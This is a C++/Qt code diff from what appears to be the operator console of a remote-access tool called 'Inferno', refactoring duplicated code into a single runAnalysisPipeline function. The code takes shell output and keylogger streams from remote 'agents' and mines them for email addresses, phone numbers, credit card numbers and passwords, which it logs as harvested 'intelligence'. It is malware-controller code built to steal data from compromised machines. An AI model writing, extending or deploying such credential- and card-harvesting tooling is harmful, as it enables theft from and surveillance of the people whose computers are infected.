@@ -478,23 +478,7 @@ void MainWindow::onShellOutputReceived(const QString& ip, const QString& output)
         appendToTelemetry(formatted);
 
         // Circle 6 analysis pipeline
-        std::string text = trimmed.toStdString();
-        auto emails = Analysis::extractEmails(text);
-        for (const auto& email : emails) {
-            Inferno_Database::instance().logIntelligence(uuid, "EMAIL", QString::fromStdString(email), "Shell Output: " + trimmed);
-        }
-        auto phones = Analysis::extractPhones(text);
-        for (const auto& phone : phones) {
-            Inferno_Database::instance().logIntelligence(uuid, "PHONE", QString::fromStdString(phone), "Shell Output: " + trimmed);
-        }
-        auto cards = Analysis::extractCreditCards(text);
-        for (const auto& card : cards) {
-            Inferno_Database::instance().logIntelligence(uuid, "CREDIT_CARD", QString::fromStdString(card), "Shell Output: " + trimmed);
-        }
-        auto passwords = Analysis::extractPasswords(text);
-        for (const auto& pair : passwords) {
-            Inferno_Database::instance().logIntelligence(uuid, "PASSWORD", QString::fromStdString(pair.first), QString::fromStdString(pair.second));
-        }
+        runAnalysisPipeline(uuid, trimmed.toStdString(), "Shell Output: " + trimmed);
     }
 
     if (m_agentList->currentItem() && m_agentList->currentItem()->data(Qt::UserRole).toString() == ip) {
@@ -550,22 +534,7 @@ void MainWindow::onKeylogReceived(const QString& ip, const QString& data) {
     }
 
     // Circle 6 analysis pipeline on the sliding window scanText
-    auto emails = Analysis::extractEmails(scanText);
-    for (const auto& email : emails) {
-        Inferno_Database::instance().logIntelligence(uuid, "EMAIL", QString::fromStdString(email), "Keylog Stream");
-    }
-    auto phones = Analysis::extractPhones(scanText);
-    for (const auto& phone : phones) {
-        Inferno_Database::instance().logIntelligence(uuid, "PHONE", QString::fromStdString(phone), "Keylog Stream");
-    }
-    auto cards = Analysis::extractCreditCards(scanText);
-    for (const auto& card : cards) {
-        Inferno_Database::instance().logIntelligence(uuid, "CREDIT_CARD", QString::fromStdString(card), "Keylog Stream");
-    }
-    auto passwords = Analysis::extractPasswords(scanText);
-    for (const auto& pair : passwords) {
-        Inferno_Database::instance().logIntelligence(uuid, "PASSWORD", QString::fromStdString(pair.first), QString::fromStdString(pair.second));
-    }
+    runAnalysisPipeline(uuid, scanText, "Keylog Stream");
 
     if (m_agentList->currentItem() && m_agentList->currentItem()->data(Qt::UserRole).toString() == ip) {
         loadIntelligenceList();
@@ -838,32 +807,7 @@ void MainWindow::forceScanHistory() {
     int new_findings = 0;
     
     // Scan keylogs chronologically
-    {
-        auto emails = Analysis::extractEmails(cleanKeylog);
-        for (const auto& email : emails) {
-            if (Inferno_Database::instance().logIntelligence(uuid, "EMAIL", QString::fromStdString(email), "Historical Keylog")) {
-                new_findings++;
-            }
-        }
-        auto phones = Analysis::extractPhones(cleanKeylog);
-        for (const auto& phone : phones) {
-            if (Inferno_Database::instance().logIntelligence(uuid, "PHONE", QString::fromStdString(phone), "Historical Keylog")) {
-                new_findings++;
-            }
-        }
-        auto cards = Analysis::extractCreditCards(cleanKeylog);
-        for (const auto& card : cards) {
-            if (Inferno_Database::instance().logIntelligence(uuid, "CREDIT_CARD", QString::fromStdString(card), "Historical Keylog")) {
-                new_findings++;
-            }
-        }
-        auto passwords = Analysis::extractPasswords(cleanKeylog);
-        for (const auto& pair : passwords) {
-            if (Inferno_Database::instance().logIntelligence(uuid, "PASSWORD", QString::fromStdString(pair.first), QString::fromStdString(pair.second))) {
-                new_findings++;
-            }
-        }
-    }
+    new_findings += runAnalysisPipeline(uuid, cleanKeylog, "Historical Keylog");
 
     QStringList telemetry = Inferno_Database::instance().getTelemetryHistory(uuid, "ALL", 5000);
     for (const QString& line : telemetry) {
@@ -874,30 +818,7 @@ void MainWindow::forceScanHistory() {
         
         std::string text = cleanLine.toStdString();
         
-        auto emails = Analysis::extractEmails(text);
-        for (const auto& email : emails) {
-            if (Inferno_Database::instance().logIntelligence(uuid, "EMAIL", QString::fromStdString(email), "Historical Telemetry")) {
-                new_findings++;
-            }
-        }
-        auto phones = Analysis::extractPhones(text);
-        for (const auto& phone : phones) {
-            if (Inferno_Database::instance().logIntelligence(uuid, "PHONE", QString::fromStdString(phone), "Historical Telemetry")) {
-                new_findings++;
-            }
-        }
-        auto cards = Analysis::extractCreditCards(text);
-        for (const auto& card : cards) {
-            if (Inferno_Database::instance().logIntelligence(uuid, "CREDIT_CARD", QString::fromStdString(card), "Historical Telemetry")) {
-                new_findings++;
-            }
-        }
-        auto passwords = Analysis::extractPasswords(text);
-        for (const auto& pair : passwords) {
-            if (Inferno_Database::instance().logIntelligence(uuid, "PASSWORD", QString::fromStdString(pair.first), QString::fromStdString(pair.second))) {
-                new_findings++;
-            }
-        }
+        new_findings += runAnalysisPipeline(uuid, text, "Historical Telemetry");
     }
 
     loadIntelligenceList();
@@ -927,6 +848,31 @@ void MainWindow::clearIntelFindings() {
         loadIntelligenceList();
         onStatusMessage("Cleared intelligence findings for agent " + ip);
     }
+}
+
+int MainWindow::runAnalysisPipeline(const QString& uuid, const std::string& text, const QString& contextLabel) {
+    int findings = 0;
+    for (const auto& email : Analysis::extractEmails(text)) {
+        if (Inferno_Database::instance().logIntelligence(uuid, "EMAIL", QString::fromStdString(email), contextLabel)) {
+            findings++;
+        }
+    }
+    for (const auto& phone : Analysis::extractPhones(text)) {
+        if (Inferno_Database::instance().logIntelligence(uuid, "PHONE", QString::fromStdString(phone), contextLabel)) {
+            findings++;
+        }
+    }
+    for (const auto& card : Analysis::extractCreditCards(text)) {
+        if (Inferno_Database::instance().logIntelligence(uuid, "CREDIT_CARD", QString::fromStdString(card), contextLabel)) {
+            findings++;
+        }
+    }
+    for (const auto& pair : Analysis::extractPasswords(text)) {
+        if (Inferno_Database::instance().logIntelligence(uuid, "PASSWORD", QString::fromStdString(pair.first), QString::fromStdString(pair.second))) {
+            findings++;
+        }
+    }
+    return findings;
 }
 
 } // namespace inferno
